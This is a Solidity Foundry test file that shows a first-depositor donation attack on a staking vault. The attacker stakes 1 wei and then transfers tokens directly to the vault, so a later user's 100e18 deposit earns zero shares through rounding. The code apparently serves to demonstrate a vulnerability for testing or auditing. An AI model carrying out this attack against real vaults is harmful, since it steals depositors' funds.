// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "./FoundryBase.t.sol";

contract ExploitStakingV1 is FoundryBaseTest {
    function setUp() public override {
        super.setUp();
        _prepare();
    }

    function test_exploit() external {
        vm.startPrank(exploit);
        // approval
        token.approve(address(instance_v1), type(uint256).max);
        // stake 1 wei
        instance_v1.stake(1);
        // donate 100e18
        token.transfer(address(instance_v1), 100e18);
        vm.stopPrank();
        logger(exploit);

        vm.startPrank(user);
        // approval
        token.approve(address(instance_v1), type(uint256).max);
        // stake 10000 token
        instance_v1.stake(100e18);
        vm.stopPrank();
        logger(user);

        console.log("");
        console.log("User get nothing of share due to round down in totalAsset as denominator.");
        console.log("User's share: ", instance_v1.shareOf(user));
    }

    function logger(address account) internal view {
        console.log("===== ===== ===== ===== =====");
        console.log(account);
        console.log("Account Asset: ", token.balanceOf(account));
        console.log("Account Share: ", instance_v1.shareOf(account));
        console.log("Vault Asset: ", instance_v1.totalAsset());
        console.log("Vault Share: ", instance_v1.totalShare());
    }
}
